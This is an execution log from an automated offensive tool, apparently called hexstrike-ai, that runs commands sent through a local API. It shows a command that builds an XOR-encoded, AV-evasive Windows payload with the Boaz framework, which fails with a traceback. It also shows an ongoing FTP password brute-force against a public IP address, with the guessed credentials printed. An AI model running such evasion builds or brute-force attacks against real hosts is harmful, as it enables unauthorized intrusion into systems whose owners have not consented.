2025-10-24 01:42:59,903 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m29.9%[0m ETA: 210.2s Speed: 1 B/s | 89.8s | PID: 44673
2025-10-24 01:43:00,394 - __main__ - INFO - 🔍 Cache MISS for command: cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py -f payload.bin -o evasive_payload.exe -l 16 -e xor -c mingw
2025-10-24 01:43:00,395 - __main__ - INFO - 🚀 EXECUTING: cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py -f payload.bin -o evasive_payload.exe -l 16 -e xor -c mingw
2025-10-24 01:43:00,395 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:43:00,398 - __main__ - INFO - 🆔 PROCESS: PID 44878 started
2025-10-24 01:43:00,398 - __main__ - INFO - 🆔 REGISTERED: Process 44878 - cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py ...
2025-10-24 01:43:00,399 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 44878
2025-10-24 01:43:00,707 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m30.2%[0m ETA: 209.4s Speed: 1 B/s | 90.6s | PID: 44673
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: [0;36m
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: ╭━━╮╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━━╮╱╱╱╱╭╮
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: ┃╭╮┃╱╱╱╱╱╱╱╱╱╱╱┃╭━━╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭╮╭╮┃╱╱╱╱┃┃
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: ┃╰╯╰┳━━┳━━┳━━━╮┃╰━━┳╮╭┳━━┳━━┳┳━━┳━╮╱╰╯┃┃┣┻━┳━━┫┃
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: ┃╭━╮┃╭╮┃╭╮┣━━┃┃┃╭━━┫╰╯┃╭╮┃━━╋┫╭╮┃╭╮╮╱╱┃┃┃╭╮┃╭╮┃┃
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: ┃╰━╯┃╰╯┃╭╮┃┃━━┫┃╰━━╋╮╭┫╭╮┣━━┃┃╰╯┃┃┃┃╱╱┃┃┃╰╯┃╰╯┃╰╮
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: ╰━━━┻━━┻╯╰┻━━━╯╰━━━╯╰╯╰╯╰┻━━┻┻━━┻╯╰╯╱╱╰╯╰━━┻━━┻━╯
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: .@@@@@@&%#%
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: .@@@@@@@%#(
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: #@@@@@@@&#((
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: @@@@@@@@@&&%%%
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: %#%%@@@@%(/*,                               ..
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: %**,,,,*****.                          #%##((////(.
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: .//***//*/                          ,%%%##(((((((#(
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: .%&%%/,,,**(#%&,                       */(##########%.
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: &@@@&&%(//   *%&@#                      ********/%%%%%
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: &@@@&%%&%(/   *%&@&,.                     *//////#&&&&#
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: .@@@&&%##&%#(/ /&&&&*.                  .*  ***/(#&&&#
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: @@@@&&%%%%&&%%%&&*               ((  .(    /***.   .,,*
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: *%&&&&&%#/,                    .//,(((/(%#/(.**,.*,,,*,
2025-10-24 01:43:00,929 - __main__ - INFO - 📤 STDOUT: /**,,/(((#&&&%, *%*******.
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: ,//*/%(((%&(// ....,/**//.
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: (*((((/////////////.
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: .,*//**,
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: [0m
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: [0;35mBoaz mini-evasion framework is starting...
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: [0m
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'input_file'[0m is selected with argument:[91m payload.bin [0m
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'output_file'[0m is selected with argument:[91m evasive_payload.exe [0m
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'loader'[0m is selected with argument:[91m 16 [0m
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'shellcode_type'[0m is selected with argument:[91m donut [0m
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'encoding'[0m is selected with argument:[91m xor [0m
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'compiler'[0m is selected with argument:[91m mingw [0m
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'entropy'[0m is selected with argument:[91m 0 [0m
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'watermark'[0m is selected with argument:[91m 1 [0m
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: The input file ends with .bin
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: Choose your Position Independent Code converter:
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: 1) donut
2025-10-24 01:43:00,930 - __main__ - INFO - 📤 STDOUT: 2) stardust
2025-10-24 01:43:00,934 - __main__ - WARNING - 📥 STDERR: Traceback (most recent call last):
2025-10-24 01:43:00,936 - __main__ - WARNING - 📥 STDERR: File "/opt/hexstrike-ai/BOAZ_beta/Boaz.py", line 1717, in <module>
2025-10-24 01:43:00,936 - __main__ - WARNING - 📥 STDERR: main()
2025-10-24 01:43:00,936 - __main__ - WARNING - 📥 STDERR: ~~~~^^
2025-10-24 01:43:00,936 - __main__ - WARNING - 📥 STDERR: File "/opt/hexstrike-ai/BOAZ_beta/Boaz.py", line 1493, in main
2025-10-24 01:43:00,936 - __main__ - WARNING - 📥 STDERR: choice = input("Choose your Position Independent Code converter:\n1) donut\n2) stardust\nEnter your choice (1 or 2): ")
2025-10-24 01:43:00,936 - __main__ - WARNING - 📥 STDERR: EOFError: EOF when reading a line
2025-10-24 01:43:00,941 - __main__ - INFO - 📤 STDOUT: Enter your choice (1 or 2):
2025-10-24 01:43:00,973 - __main__ - INFO - 🧹 CLEANUP: Process 44878 removed from registry
2025-10-24 01:43:00,973 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.58s
2025-10-24 01:43:00,973 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:43:00,973 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:43:00,973 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:43:00,973 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py -f pa...
2025-10-24 01:43:00,973 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.58s
2025-10-24 01:43:00,973 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 2746 bytes
2025-10-24 01:43:00,973 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:43:00,973 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:43:00,973 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:43:00,974 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:43:00] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:43:01,510 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m30.5%[0m ETA: 208.6s Speed: 1 B/s | 91.4s | PID: 44673
2025-10-24 01:43:01,713 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2016 (Incorrect: )
2025-10-24 01:43:02,310 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m30.7%[0m ETA: 207.8s Speed: 1 B/s | 92.2s | PID: 44673
2025-10-24 01:43:03,116 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m31.0%[0m ETA: 207.0s Speed: 1 B/s | 93.0s | PID: 44673
2025-10-24 01:43:03,927 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m31.3%[0m ETA: 206.2s Speed: 1 B/s | 93.8s | PID: 44673
2025-10-24 01:43:04,729 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m31.5%[0m ETA: 205.4s Speed: 1 B/s | 94.6s | PID: 44673
2025-10-24 01:43:05,530 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m31.8%[0m ETA: 204.6s Speed: 1 B/s | 95.4s | PID: 44673
2025-10-24 01:43:05,560 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2015 (Incorrect: )
2025-10-24 01:43:06,333 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m32.1%[0m ETA: 203.8s Speed: 1 B/s | 96.2s | PID: 44673
2025-10-24 01:43:07,136 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m32.3%[0m ETA: 203.0s Speed: 1 B/s | 97.0s | PID: 44673
2025-10-24 01:43:07,938 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m32.6%[0m ETA: 202.2s Speed: 1 B/s | 97.8s | PID: 44673
2025-10-24 01:43:08,739 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m32.9%[0m ETA: 201.4s Speed: 1 B/s | 98.6s | PID: 44673
2025-10-24 01:43:09,540 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m33.1%[0m ETA: 200.6s Speed: 1 B/s | 99.4s | PID: 44673
2025-10-24 01:43:09,644 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2014 (Incorrect: )
2025-10-24 01:43:10,341 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m33.4%[0m ETA: 199.8s Speed: 1 B/s | 100.2s | PID: 44673
2025-10-24 01:43:11,142 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m33.7%[0m ETA: 199.0s Speed: 1 B/s | 101.0s | PID: 44673
2025-10-24 01:43:11,943 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m33.9%[0m ETA: 198.2s Speed: 1 B/s | 101.8s | PID: 44673
2025-10-24 01:43:12,745 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m34.2%[0m ETA: 197.4s Speed: 1 B/s | 102.6s | PID: 44673
2025-10-24 01:43:13,256 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2013 (Incorrect: )
2025-10-24 01:43:13,545 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m34.5%[0m ETA: 196.6s Speed: 1 B/s | 103.4s | PID: 44673
2025-10-24 01:43:14,346 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m34.7%[0m ETA: 195.8s Speed: 1 B/s | 104.2s | PID: 44673
2025-10-24 01:43:15,151 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m35.0%[0m ETA: 195.0s Speed: 1 B/s | 105.0s | PID: 44673
2025-10-24 01:43:15,954 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m35.3%[0m ETA: 194.2s Speed: 1 B/s | 105.8s | PID: 44673
2025-10-24 01:43:16,426 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:winter2017 (Incorrect: )
2025-10-24 01:43:16,755 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m35.5%[0m ETA: 193.4s Speed: 1 B/s | 106.6s | PID: 44673
2025-10-24 01:43:17,560 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m35.8%[0m ETA: 192.6s Speed: 1 B/s | 107.4s | PID: 44673
2025-10-24 01:43:18,362 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m36.1%[0m ETA: 191.8s Speed: 1 B/s | 108.2s | PID: 44673
2025-10-24 01:43:19,163 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m36.3%[0m ETA: 191.0s Speed: 1 B/s | 109.0s | PID: 44673
2025-10-24 01:43:19,964 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m36.6%[0m ETA: 190.2s Speed: 1 B/s | 109.8s | PID: 44673
2025-10-24 01:43:20,676 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:winter2016 (Incorrect: )
2025-10-24 01:43:20,767 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m36.9%[0m ETA: 189.4s Speed: 1 B/s | 110.6s | PID: 44673
2025-10-24 01:43:21,568 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m37.1%[0m ETA: 188.6s Speed: 1 B/s | 111.4s | PID: 44673
2025-10-24 01:43:22,369 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m37.4%[0m ETA: 187.8s Speed: 1 B/s | 112.2s | PID: 44673
2025-10-24 01:43:23,170 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m37.7%[0m ETA: 187.0s Speed: 1 B/s | 113.0s | PID: 44673
2025-10-24 01:43:23,971 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m37.9%[0m ETA: 186.2s Speed: 1 B/s | 113.8s | PID: 44673
2025-10-24 01:43:24,129 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:winter2015 (Incorrect: )
2025-10-24 01:43:24,771 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m38.2%[0m ETA: 185.4s Speed: 1 B/s | 114.6s | PID: 44673
2025-10-24 01:43:25,572 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m38.5%[0m ETA: 184.6s Speed: 1 B/s | 115.4s | PID: 44673
2025-10-24 01:43:26,373 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m38.7%[0m ETA: 183.8s Speed: 1 B/s | 116.2s | PID: 44673
2025-10-24 01:43:27,174 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m39.0%[0m ETA: 183.0s Speed: 1 B/s | 117.0s | PID: 44673
2025-10-24 01:43:27,472 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:winter2014 (Incorrect: )
2025-10-24 01:43:27,975 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m39.3%[0m ETA: 182.2s Speed: 1 B/s | 117.8s | PID: 44673
2025-10-24 01:43:28,776 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m39.5%[0m ETA: 181.4s Speed: 0 B/s | 118.6s | PID: 44673
2025-10-24 01:43:29,579 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m39.8%[0m ETA: 180.6s Speed: 0 B/s | 119.4s | PID: 44673
2025-10-24 01:43:30,380 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m40.1%[0m ETA: 179.8s Speed: 0 B/s | 120.2s | PID: 44673
2025-10-24 01:43:30,558 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:winter2013 (Incorrect: )
2025-10-24 01:43:31,180 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m40.3%[0m ETA: 179.0s Speed: 0 B/s | 121.0s | PID: 44673
2025-10-24 01:43:31,982 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m40.6%[0m ETA: 178.2s Speed: 0 B/s | 121.8s | PID: 44673
2025-10-24 01:43:32,783 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m40.9%[0m ETA: 177.4s Speed: 0 B/s | 122.6s | PID: 44673
2025-10-24 01:43:33,584 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m41.1%[0m ETA: 176.6s Speed: 0 B/s | 123.4s | PID: 44673
2025-10-24 01:43:34,077 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:P@55w0rd (Incorrect: )
2025-10-24 01:43:34,384 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m41.4%[0m ETA: 175.8s Speed: 0 B/s | 124.2s | PID: 44673
2025-10-24 01:43:35,185 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m41.7%[0m ETA: 175.0s Speed: 0 B/s | 125.0s | PID: 44673
2025-10-24 01:43:35,987 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m42.0%[0m ETA: 174.1s Speed: 0 B/s | 125.9s | PID: 44673
2025-10-24 01:43:36,788 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m42.2%[0m ETA: 173.3s Speed: 0 B/s | 126.7s | PID: 44673
2025-10-24 01:43:37,480 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:P@ssw0rd! (Incorrect: )
2025-10-24 01:43:37,590 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m42.5%[0m ETA: 172.5s Speed: 0 B/s | 127.5s | PID: 44673
2025-10-24 01:43:38,393 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m42.8%[0m ETA: 171.7s Speed: 0 B/s | 128.3s | PID: 44673
2025-10-24 01:43:39,197 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m43.0%[0m ETA: 170.9s Speed: 0 B/s | 129.1s | PID: 44673
2025-10-24 01:43:40,000 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m43.3%[0m ETA: 170.1s Speed: 0 B/s | 129.9s | PID: 44673
2025-10-24 01:43:40,611 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:P@55w0rd! (Incorrect: )
2025-10-24 01:43:40,802 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m43.6%[0m ETA: 169.3s Speed: 0 B/s | 130.7s | PID: 44673
2025-10-24 01:43:41,605 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m43.8%[0m ETA: 168.5s Speed: 0 B/s | 131.5s | PID: 44673
2025-10-24 01:43:42,406 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m44.1%[0m ETA: 167.7s Speed: 0 B/s | 132.3s | PID: 44673
2025-10-24 01:43:43,208 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m44.4%[0m ETA: 166.9s Speed: 0 B/s | 133.1s | PID: 44673
2025-10-24 01:43:44,009 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m44.6%[0m ETA: 166.1s Speed: 0 B/s | 133.9s | PID: 44673
2025-10-24 01:43:44,811 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m44.9%[0m ETA: 165.3s Speed: 0 B/s | 134.7s | PID: 44673
2025-10-24 01:43:44,838 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sqlsqlsqlsql (Incorrect: )
2025-10-24 01:43:45,612 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m45.2%[0m ETA: 164.5s Speed: 0 B/s | 135.5s | PID: 44673
2025-10-24 01:43:46,415 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m45.4%[0m ETA: 163.7s Speed: 0 B/s | 136.3s | PID: 44673
2025-10-24 01:43:47,216 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m45.7%[0m ETA: 162.9s Speed: 0 B/s | 137.1s | PID: 44673
2025-10-24 01:43:48,017 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m46.0%[0m ETA: 162.1s Speed: 0 B/s | 137.9s | PID: 44673
2025-10-24 01:43:48,593 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:SQLSQLSQLSQL (Incorrect: )
2025-10-24 01:43:48,818 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m46.2%[0m ETA: 161.3s Speed: 0 B/s | 138.7s | PID: 44673
2025-10-24 01:43:49,620 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m46.5%[0m ETA: 160.5s Speed: 0 B/s | 139.5s | PID: 44673
2025-10-24 01:43:50,420 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m46.8%[0m ETA: 159.7s Speed: 0 B/s | 140.3s | PID: 44673
2025-10-24 01:43:51,221 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m47.0%[0m ETA: 158.9s Speed: 0 B/s | 141.1s | PID: 44673
2025-10-24 01:43:51,899 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Welcome123 (Incorrect: )
2025-10-24 01:43:52,022 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m47.3%[0m ETA: 158.1s Speed: 0 B/s | 141.9s | PID: 44673
2025-10-24 01:43:52,825 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m47.6%[0m ETA: 157.3s Speed: 0 B/s | 142.7s | PID: 44673
2025-10-24 01:43:53,626 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m47.8%[0m ETA: 156.5s Speed: 0 B/s | 143.5s | PID: 44673
